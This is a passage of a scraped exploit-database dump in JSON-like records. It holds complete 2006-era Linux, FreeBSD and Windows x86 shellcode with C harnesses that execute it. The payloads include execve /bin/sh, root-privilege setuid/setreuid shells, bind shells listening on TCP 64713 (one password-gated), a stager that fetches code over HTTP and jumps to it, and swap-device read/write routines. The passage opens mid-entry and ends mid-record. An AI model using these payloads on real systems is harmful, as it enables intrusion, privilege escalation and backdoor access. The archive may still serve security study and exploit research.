"\t\t\t\t// (0x1f91 = 8081/tcp)", "\t\t\t\t//", "", "\t//", "\t// \"\\x66\\xbd\\xaf\\xff\"\t// mov $0xffaf, %bp", "\t//\t\t\t// (0xafff = ~0080/tcp)", "\t// \"\\x66\\xf7\\xd5\"       // not %bp", "\t//", "", "\t\"\\xf7\\xd6\"              // not %esi ", "\t\"\\x56\"                  // push %esi ", "\t\"\\x0f\\xcd\"              // bswap %ebp ", "\t\"\\x09\\xdd\"              // or %ebx,%ebp ", "\t\"\\x55\"                  // push %ebp ", "\t\"\\x43\"                  // inc %ebx ", "\t\"\\x6a\\x10\"              // push $0x10 ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x50\"                  // push %eax ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "", "\t//", "\t// <paste here the code, that gen_httpreq.c outputs!>", "\t//", "", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xb0\\x04\"              // mov $0x4,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "", "\t//", "\t// <_recv_http_request>:", "\t//", "", "\t\"\\xb0\\x03\"              // mov $0x3,%al ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\x5a\"                  // pop %edx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x41\"                  // inc %ecx ", "\t\"\\x85\\xc0\"              // test %eax,%eax ", "\t\"\\x75\\xf4\"              // jne <_recv_http_request> ", "\t\"\\x83\\xe9\\x06\"          // sub $0x6,%ecx ", "\t\"\\xff\\xe1\";             // jmp *%ecx ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-03-12]"]},
{"Title": "Linux/x86 - execve(\"/bin/sh\", [\"/bin/sh\", NULL]) Shellcode (25 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-03", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13375.c", "View": "https://old.exploit-db.com/raw/13375/", "code": ["/*", " * (Linux/x86) execve(\"/bin/sh\", [\"/bin/sh\", NULL]) ", " * - 25 bytes", " * - xgc@gotfault.net", " *", " */", "", "char shellcode[] =", "", "  \"\\x31\\xc0\"                    // xor    %eax, %eax", "  \"\\x50\"                        // push   %eax", "  \"\\x68\\x2f\\x2f\\x73\\x68\"        // push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"        // push   $0x6e69622f", "  \"\\x89\\xe3\"                    // mov    %esp, %ebx", "  \"\\x50\"                        // push   %eax", "  \"\\x53\"                        // push   %ebx", "  \"\\x89\\xe1\"                    // mov    %esp, %ecx", "  \"\\x31\\xd2\"                    // xor    %edx, %edx", "  \"\\xb0\\x0b\"                    // mov    $0xb, %al", "  \"\\xcd\\x80\";                   // int    $0x80", "", "int main() {", "", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-03]"]},
{"Title": "Linux/x86 - execve(\"/bin/sh\", [\"/bin/sh\", NULL]) Shellcode (23 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-03", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13376.c", "View": "https://old.exploit-db.com/raw/13376/", "code": ["/*", " * linux-x86-binshv2.c - 23 bytes", " * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>", " *", " * (Linux/x86) execve(\"/bin/sh\", [\"/bin/sh\", NULL])", " *", " */", "", "", "char shellcode[] =", "", "  \"\\x6a\\x0b\"\t\t\t// push   $0xb", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x99\"                        // cltd", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t// push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t// push   $0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov    %esp, %ebx", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x53\"\t\t\t// push   %ebx", "  \"\\x89\\xe1\"\t\t\t// mov    %esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int    $0x80", " ", "int main() {", " ", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-03]"]},
{"Title": "Linux/x86 - setuid(0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL]) Shellcode (31 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-03", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13377.c", "View": "https://old.exploit-db.com/raw/13377/", "code": ["/*", " * (Linux/x86) setuid(0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL])", " * - 31 bytes", " * - xgc@gotfault.net", " *", " */", "", "char shellcode[] =", "", "  \"\\x6a\\x17\"\t\t\t// push\t$0x17", "  \"\\x58\"\t\t\t// pop \t%eax", "  \"\\x31\\xdb\"\t\t\t// xor\t%ebx, %ebx", "  \"\\xcd\\x80\"\t\t\t// int\t$0x80", "", "  \"\\x31\\xd2\"\t\t\t// xor\t%edx, %edx  ", "  \"\\x6a\\x0b\"\t\t\t// push\t$0xb", "  \"\\x58\"\t\t\t// pop\t%eax", "  \"\\x52\"\t\t\t// push\t%edx", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t// push\t$0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t// push\t$0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov\t%esp, %ebx", "  \"\\x52\"\t\t\t// push\t%edx", "  \"\\x53\"\t\t\t// push\t%ebx", "  \"\\x89\\xe1\"\t\t\t// mov\t%esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int\t$0x80", " ", "int main() {", " ", "\tint (*f)() = (int(*)())shellcode;", "\tprintf(\"Length: %u\\n\", strlen(shellcode));", "\tf();", "}", "", "// milw0rm.com [2006-04-03]"]},
{"Title": "Linux/x86 - setuid(0) + setgid(0) + execve(/bin/sh, [/bin/sh, NULL]) Shellcode (37 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-03", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-251.php", "View": null, "code": ["/*", " * (Linux/x86) setuid(0) + setgid(0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL]) ", " * - 37 bytes", " * - xgc@gotfault.net", " *", " */", "", "char shellcode[] =", "", "  \"\\x6a\\x17\"\t\t\t// push\t$0x17", "  \"\\x58\"\t\t\t// pop \t%eax", "  \"\\x31\\xdb\"\t\t\t// xor\t%ebx, %ebx", "  \"\\xcd\\x80\"\t\t\t// int\t$0x80", "", "  \"\\x6a\\x2e\"\t\t\t// push\t$0x2e\t", "  \"\\x58\"\t\t\t// pop\t%eax", "  \"\\x53\"\t\t\t// push %ebx", "  \"\\xcd\\x80\"\t\t\t// int\t$0x80", "", "  \"\\x31\\xd2\"\t\t\t// xor\t%edx, %edx", "  \"\\x6a\\x0b\"\t\t\t// push\t$0xb", "  \"\\x58\"\t\t\t// pop\t%eax", "  \"\\x52\"\t\t\t// push\t%edx", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t// push\t$0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t// push\t$0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov\t%esp, %ebx", "  \"\\x52\"\t\t\t// push\t%edx", "  \"\\x53\"\t\t\t// push\t%ebx", "  \"\\x89\\xe1\"\t\t\t// mov\t%esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int\t$0x80", " ", "int main() {", " ", "\tint (*f)() = (int(*)())shellcode;", "    printf(\"Length: %u\\n\", strlen(shellcode));", "    f();", "}", "", "// milw0rm.com [2006-04-03]"]},
{"Title": "Linux/x86 - setreuid(0,0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL]) Shellcode (33 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-03", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-250.php", "View": null, "code": ["/*", " * (Linux/x86) setreuid(0,0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL])", " * - 33 bytes", " * - xgc@gotfault.net", " *", " */", "", "char shellcode[] =", "", "  \"\\x6a\\x46\"\t\t\t// push   $0x46", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x31\\xdb\"\t\t\t// xor\t  %ebx, %ebx", "  \"\\x31\\xc9\"\t\t\t// xor\t  %ecx, %ecx", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  \"\\x31\\xd2\"\t\t\t// xor    %edx, %edx", "  \"\\x6a\\x0b\"\t\t\t// push   $0xb", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t// push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t// push   $0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov    %esp, %ebx", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x53\"\t\t\t// push   %ebx", "  \"\\x89\\xe1\"\t\t\t// mov    %esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int    $0x80", " ", "int main() {", " ", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-03]"]},
{"Title": "Linux/x86 - Bind (64713/TCP) Shell (/bin/sh) + Password (gotfault) Shellcode (166 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-06", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-253.php", "View": null, "code": ["/* ", " * linux-x86-authportbind.c - AUTH portbind shellcode 166 bytes for Linux/x86", " * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>", " * ", " * portbind shellcode that bind()'s a shell on port 64713/tcp", " * and requests a user password.", " *", " */", "", "char shellcode[] = ", "", "  /* socket(AF_INET, SOCK_STREAM, 0) */", "", "  \"\\x6a\\x66\"\t\t\t// push   $0x66", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x6a\\x01\"\t\t\t// push   $0x1", "  \"\\x5b\"\t\t\t// pop    %ebx", "  \"\\x99\"\t\t\t// cltd", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x53\"\t\t\t// push   %ebx", "  \"\\x6a\\x02\"\t\t\t// push   $0x2", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* bind(s, server, sizeof(server)) */", "", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x66\\x68\\xfc\\xc9\"\t\t// pushw  $0xc9fc  // PORT = 64713", "  \"\\x66\\x6a\\x02\"\t\t// pushw  $0x2", "  \"\\x89\\xe1\"\t\t\t// mov    $esp,%ecx", "  \"\\x6a\\x10\"\t\t\t// push   $0x10", "  \"\\x51\"\t\t\t// push   %ecx", "  \"\\x50\"\t\t\t// push   %eax", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\x89\\xc6\"\t\t\t// mov    %eax,%esi", "  \"\\x43\"\t\t\t// inc    %ebx", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* listen(s, anything) */", "", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xd1\\xe3\"\t\t\t// shl    %ebx", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* accept(s, 0, 0) */", "", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x56\"\t\t\t// push   %esi", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\x43\"\t\t\t// inc    %ebx", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  \"\\x96\"\t\t\t// xchg   %eax,%esi", "", "  /* send(s, \"Password: \", 0x0a, flags) */", "", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x68\\x72\\x64\\x3a\\x20\"\t// push   $0x203a6472", "  \"\\x68\\x73\\x73\\x77\\x6f\"\t// push   $0x6f777373", "  \"\\x66\\x68\\x50\\x61\"\t\t// pushw  $0x6150", "  \"\\x89\\xe7\"\t\t\t// mov    $esp,%edi", "  \"\\x6a\\x0a\"\t\t\t// push   $0xa", "  \"\\x57\"\t\t\t// push   %edi", "  \"\\x56\"\t\t\t// push   %esi", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\xb3\\x09\"\t\t\t// mov    $0x9,%bl", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* recv(s, *buf, 0x08, flags) */", "", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x6a\\x08\"\t\t\t// push   $0x8", "  \"\\x8d\\x4c\\x24\\x08\"\t\t// lea    0x8(%esp),%ecx", "  \"\\x51\"\t\t\t// push   %ecx", "  \"\\x56\"\t\t\t// push   %esi", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\xb3\\x0a\"\t\t\t// mov    $0xa,%bl", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  \"\\x87\\xf3\"\t\t\t// xchg   %esi,%ebx", "", "  /* like: strncmp(string1, string2, 0x8) */", "  ", "  \"\\x52\"                        // push   %edx", "  \"\\x68\\x61\\x75\\x6c\\x74\"\t// push   $0x746c7561 // password", "  \"\\x68\\x67\\x6f\\x74\\x66\"\t// push   $0x66746f67 // here", "  \"\\x89\\xe7\"\t\t\t// mov    %esp,%edi", "  \"\\x8d\\x74\\x24\\x1c\"\t\t// lea    0x1c(%esp),%esi", "  \"\\x89\\xd1\"\t\t\t// mov    %edx,%ecx", "  \"\\x80\\xc1\\x08\"\t\t// add    $0x8,%cl", "  \"\\xfc\"\t\t\t// cld", "  \"\\xf3\\xa6\"\t\t\t// repz   cmpsb %es:(%edi),%ds:(%esi)", "  \"\\x74\\x04\"\t\t\t// je     dup", "", "  /* exit(something) */", "", "  \"\\xf7\\xf0\"\t\t\t// div    %eax", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */", "", "  \"\\x6a\\x02\"\t\t\t// push   $0x2", "  \"\\x59\"\t\t\t// pop    %ecx", "", "  \"\\xb0\\x3f\"\t\t\t// mov    $0x3f,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "  \"\\x49\"\t\t\t// dec    %ecx", "  \"\\x79\\xf9\"\t\t\t// jns    dup_loop", "", "  /* execve(\"/bin/sh\", [\"/bin/sh\"], NULL) */", "", "  \"\\x6a\\x0b\"\t\t\t// push   $0xb", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t// push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t// push   $0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov    %esp, %ebx", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x53\"\t\t\t// push   %ebx", "  \"\\x89\\xe1\"\t\t\t// mov    %esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int    $0x80", "", "", "int main() {", " ", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-06]"]},
{"Title": "Linux/x86 - Bind (64713/TCP) Shell (/bin/sh) Shellcode (86 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-06", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-252.php", "View": null, "code": ["/* ", " * linux-x86-portbind.c - portbind shellcode 86 bytes for Linux/x86", " * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>", " * ", " * portbind shellcode that bind()'s a shell on port 64713/tcp", " *", " */", "", "char shellcode[] = ", "", "  /* socket(AF_INET, SOCK_STREAM, 0) */", "", "  \"\\x6a\\x66\"\t\t\t// push   $0x66", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x6a\\x01\"\t\t\t// push   $0x1", "  \"\\x5b\"\t\t\t// pop    %ebx", "  \"\\x99\"\t\t\t// cltd", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x53\"\t\t\t// push   %ebx", "  \"\\x6a\\x02\"\t\t\t// push   $0x2", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* bind(s, server, sizeof(server)) */", "", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x66\\x68\\xfc\\xc9\"\t\t// pushw  $0xc9fc  // PORT = 64713", "  \"\\x66\\x6a\\x02\"\t\t// pushw  $0x2", "  \"\\x89\\xe1\"\t\t\t// mov    $esp,%ecx", "  \"\\x6a\\x10\"\t\t\t// push   $0x10", "  \"\\x51\"\t\t\t// push   %ecx", "  \"\\x50\"\t\t\t// push   %eax", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\x89\\xc6\"\t\t\t// mov    %eax,%esi", "  \"\\x43\"\t\t\t// inc    %ebx", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* listen(s, anything) */", "", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xd1\\xe3\"\t\t\t// shl    %ebx", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  /* accept(s, 0, 0) */", "", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x56\"\t\t\t// push   %esi", "  \"\\x89\\xe1\"\t\t\t// mov    %esp,%ecx", "  \"\\x43\"\t\t\t// inc    %ebx", "  \"\\xb0\\x66\"\t\t\t// mov    $0x66,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "", "  \"\\x93\"\t\t\t// xchg   %eax,%ebx", "", "  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */", "", "  \"\\x6a\\x02\"\t\t\t// push   $0x2", "  \"\\x59\"\t\t\t// pop    %ecx", "", "  \"\\xb0\\x3f\"\t\t\t// mov    $0x3f,%al", "  \"\\xcd\\x80\"\t\t\t// int    $0x80", "  \"\\x49\"\t\t\t// dec    %ecx", "  \"\\x79\\xf9\"\t\t\t// jns    dup_loop", "", "  /* execve(\"/bin/sh\", [\"/bin/sh\"], NULL) */", "", "  \"\\x6a\\x0b\"\t\t\t// push   $0xb", "  \"\\x58\"\t\t\t// pop    %eax", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t// push   $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t// push   $0x6e69622f", "  \"\\x89\\xe3\"\t\t\t// mov    %esp, %ebx", "  \"\\x52\"\t\t\t// push   %edx", "  \"\\x53\"\t\t\t// push   %ebx", "  \"\\x89\\xe1\"\t\t\t// mov    %esp, %ecx", "  \"\\xcd\\x80\";\t\t\t// int    $0x80", "", "int main() {", " ", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-06]"]},
{"Title": "FreeBSD/x86 - execve(/bin/sh) Shellcode (23 bytes) (1)", "Author": "IZ", "Published": ": 2006-04-14", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-170.php", "View": null, "code": ["/*", "", " *", " * FreeBSD_x86-execve_sh-23b-iZ.c (Shellcode, execve /bin/sh, 23 bytes)", " *", " * by IZ <guerrilla.sytes.net>", " *", " */", "", "", "char setreuidcode[] =", "", "\"\\x31\\xc0\"                  /* xor %eax,%eax */", "\"\\x50\"                      /* push %eax */", "\"\\x68\\x2f\\x2f\\x73\\x68\"      /* push $0x68732f2f (//sh) */", "\"\\x68\\x2f\\x62\\x69\\x6e\"      /* push $0x6e69622f (/bin)*/", "", "\"\\x89\\xe3\"                  /* mov %esp,%ebx */", "\"\\x50\"                      /* push %eax */", "\"\\x54\"                      /* push %esp */", "\"\\x53\"                      /* push %ebx */", "", "\"\\x50\"                      /* push %eax */", "\"\\xb0\\x3b\"                  /* mov $0x3b,%al */", "\"\\xcd\\x80\";                 /* int $0x80 */", "", "", "void main()", "{", "     int*     ret;         ", "", "     ret = (int*) &ret + 2;", "", "     printf(\"len %d\\n\",strlen(setreuidcode));", "", "     (*ret) = (int) setreuidcode; ", "} ", "", "// milw0rm.com [2006-04-14]"]},
{"Title": "Windows/x86 (SP1/SP2) - Beep Shellcode (35 bytes)", "Author": "xnull", "Published": ": 2006-04-14", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-152.php", "View": null, "code": ["/*", "Shellcode can be changed to work with any windows distribution by changing the address of Beep in kernel32.dll", "Addresses for SP1 and SP2", "", "-xnull", "*/", "", "#include <stdio.h>", "", "unsigned char beepsp1[] =", "\"\\x55\\x89\\xE5\\x83\\xEC\\x18\\xC7\\x45\\xFC\"", "\"\\x10\\xC9\\xEA\\x77\"                      //Address \\x10\\xC9\\xEA\\x77 = SP1", "\"\\xC7\\x44\\x24\\x04\"", "\"\\xE8\\x03\"                              //Length \\xE8\\x03 = 1000 (1 second)", "\"\\x00\\x00\\xC7\\x04\\x24\"", "\"\\xE8\\x03\"                              //Frequency  \\xE8\\x03 = 1000", "\"\\x00\\x00\\x8B\\x45\\xFC\\xFF\\xD0\\xC9\\xC3\";", "", "unsigned char beepsp2[] =", "\"\\x55\\x89\\xE5\\x83\\xEC\\x18\\xC7\\x45\\xFC\"", "\"\\x53\\x8A\\x83\\x7C\"                      //Address \\x53\\x8A\\x83\\x7C = SP2", "\"\\xC7\\x44\\x24\\x04\"", "\"\\xD0\\x03\"                              //Length \\xD0\\x03 = 2000 (2 seconds)", "\"\\x00\\x00\\xC7\\x04\\x24\"", "\"\\x01\\x0E\"                              //Frequency \\x01\\x0E = 3585", "\"\\x00\\x00\\x8B\\x45\\xFC\\xFF\\xD0\\xC9\\xC3\";", "", "int main()", "{", "    void (*function)();", "    *(long*)&function = (long)beepsp1;", "    function();", "}", "", "// milw0rm.com [2006-04-14]"]},
{"Title": "Linux/x86 - Read SWAP + Write To /tmp/swr Shellcode (109 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-16", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-255.php", "View": null, "code": ["/*", " * linux-x86-swap-restore.c - SWAP restore shellcode 109 bytes for Linux/x86", " * Copyright (c) 2006 Gotfault Security & rfdslabs", " *", " * Authors:", " *", " *      dx      <xgc@gotfault.net>", " *      spud    <gustavo@rfdslabs.com.br>", " *", " * This shellcode reads the swap device at offset 31337. After it searchs by", " * NULL byte, it stops and write the readed content to '/tmp/swr' file.", " * Probaly you needs to change the device path name in open() device syscall.", " *", " */", "", "char shellcode[] =", "", "  /* open(device, O_RDONLY) */", "", "  \"\\x6a\\x05\"                    // push   $0x5", "  \"\\x58\"                        // pop    %eax", "  \"\\x99\"                        // cltd   ", "  \"\\x52\"                        // push   %edx", "  \"\\x68\\x73\\x64\\x61\\x31\"        // push   $0x31616473", "  \"\\x68\\x64\\x65\\x76\\x2f\"        // push   $0x2f766564", "  \"\\x66\\x68\\x2f\\x2f\"            // pushw  $0x2f2f", "  \"\\x89\\xe3\"                    // mov    %esp,%ebx", "  \"\\x52\"                        // push   %edx", "  \"\\x59\"                        // pop    %ecx", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x93\"                        // xchg   %eax,%ebx", "", "  /* lseek(fd_device, 31337, SEEK_SET) */", "", "  \"\\x31\\xc9\"                    // xor    %ecx,%ecx", "  \"\\x6a\\x13\"                    // push   $0x13", "  \"\\x58\"                        // pop    %eax", "  \"\\x66\\xb9\\x69\\x7a\"            // mov    $0x7a69,%cx", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  /* read(fd_device, *buf, 1025) */", "", "  \"\\x89\\xe1\"                    // mov    %esp,%ecx", "  \"\\x42\"                        // inc    %edx", "  \"\\xc1\\xe2\\x0a\"                // shl    $0xa,%edx", "  \"\\x42\"                        // inc    %edx", "  \"\\x6a\\x03\"                    // push   $0x3", "  \"\\x58\"                        // pop    %eax", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x89\\xe6\"                    // mov    %esp,%esi", "  \"\\x99\"                        // cltd   ", "  \"\\x31\\xff\"                    // xor    %edi,%edi", "", "  /* counter loop - read each byte and searchs by 0x0. */", "", "  \"\\xac\"                        // lods   %ds", "  \"\\x38\\xd0\"                    // cmp    %dl,%al", "  \"\\x74\\x04\"                    // je     80480b3 <close_device>", "  \"\\x47\"                        // inc    %edi", "  \"\\xeb\\xf8\"                    // jmp    80480aa <counter>", "", "  \"\\x91\"                        // xchg   %eax,%ecx", "", "  /* close(fd_device) */", "", "  \"\\x6a\\x06\"                    // push   $0x6", "  \"\\x58\"                        // pop    %eax", "  \"\\xcd\\x80\"                    // int    $0x80", "  \"\\x89\\xe6\"                    // mov    %esp,%esi", "", "  /* open(\"/tmp/swr\", O_CREAT|O_APPEND|O_WRONLY) */", "", "  \"\\x66\\xb9\\x41\\x04\"            // mov    $0x441,%cx", "  \"\\x52\"                        // push   %edx", "  \"\\x68\\x2f\\x73\\x77\\x72\"        // push   $0x7277732f", "  \"\\x68\\x2f\\x74\\x6d\\x70\"        // push   $0x706d742f", "  \"\\x89\\xe3\"                    // mov    %esp,%ebx", "  \"\\xb0\\x05\"                    // mov    $0x5,%al", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x93\"                        // xchg   %eax,%ebx", "", "  /* write(fd_filename, *buf, sizeof(buffer)) */", "", "  \"\\x6a\\x04\"                    // push   $0x4", "  \"\\x58\"                        // pop    %eax", "  \"\\x56\"                        // push   %esi", "  \"\\x59\"                        // pop    %ecx", "  \"\\x89\\xfa\"                    // mov    %edi,%edx", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  /* close(fd_filename) */", "", "  \"\\xb0\\x06\"                    // mov    $0x6,%al", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  /* exit(anything) */", "", "  \"\\xb0\\x01\"                    // mov    $0x1,%al", "  \"\\xcd\\x80\"                    // int    $0x80", ";", "", "int main() {", " ", "        int (*f)() = (int(*)())shellcode;", "        printf(\"Length: %u\\n\", strlen(shellcode));", "        f();", "}", "", "// milw0rm.com [2006-04-16]"]},
{"Title": "Linux/x86 - Read /tmp/sws + Store In SWAP Shellcode (99 bytes)", "Author": "Gotfault Security", "Published": ": 2006-04-16", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-254.php", "View": null, "code": ["/* ", " * linux-x86-swap-store.c - SWAP store shellcode 99 bytes for Linux/x86", " * Copyright (c) 2006 Gotfault Security & rfdslabs", " *", " * Authors:", " *", " *\tdx \t<xgc@gotfault.net> ", " *\tspud\t<gustavo@rfdslabs.com.br>", " * ", " * This shellcode reads the content of '/tmp/sws' and stores on swap ", " * device at offset 31337. Probaly needs to change the device path name", " * in open() device syscall.", " *", " */", "", "char shellcode[] =", "", "  /* open(device, O_WRONLY) */", "", "  \"\\x6a\\x05\"                    // push   $0x5", "  \"\\x58\"                        // pop    %eax", "  \"\\x99\"                        // cltd   ", "  \"\\x52\"                        // push   %edx", "  \"\\x68\\x73\\x64\\x61\\x31\"        // push   $0x31616473", "  \"\\x68\\x64\\x65\\x76\\x2f\"        // push   $0x2f766564", "  \"\\x66\\x68\\x2f\\x2f\"            // pushw  $0x2f2f", "  \"\\x89\\xe3\"                    // mov    %esp,%ebx", "  \"\\x6a\\x01\"                    // push   $0x1", "  \"\\x59\"                        // pop    %ecx", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x97\"                        // xchg   %eax,%edi", "", "  /* open(\"/tmp/sws\", O_RDONLY) */", "", "  \"\\x49\"                        // dec    %ecx", "  \"\\x52\"                        // push   %edx", "  \"\\x68\\x2f\\x73\\x77\\x73\"        // push   $0x7377732f", "  \"\\x68\\x2f\\x74\\x6d\\x70\"        // push   $0x706d742f", "  \"\\x89\\xe3\"                    // mov    %esp,%ebx", "  \"\\x6a\\x05\"                    // push   $0x5", "  \"\\x58\"                        // pop    %eax", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x93\"                        // xchg   %eax,%ebx", "", "  /* read(fd_filename, *buf, 256) */", "", "  \"\\x89\\xe1\"                    // mov    %esp,%ecx", "  \"\\x42\"                        // inc    %edx", "  \"\\xc1\\xe2\\x0a\"                // shl    $0xa,%edx", "  \"\\x6a\\x03\"                    // push   $0x3", "  \"\\x58\"                        // pop    %eax", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x96\"                        // xchg   %eax,%esi", "", "  /* close(fd_filename) */", "", "  \"\\x6a\\x06\"                    // push   $0x6", "  \"\\x58\"                        // pop    %eax", "  \"\\xcd\\x80\"                    // int    $0x80", "", "  \"\\x92\"                        // xchg   %eax,%edx", "", "  /* lseek(fd_device, 31337, SEEK_SET) */", "", "  \"\\x31\\xc9\"                    // xor    %ecx,%ecx", "  \"\\x6a\\x13\"                    // push   $0x13", "  \"\\x58\"                        // pop    %eax", "  \"\\x89\\xfb\"                    // mov    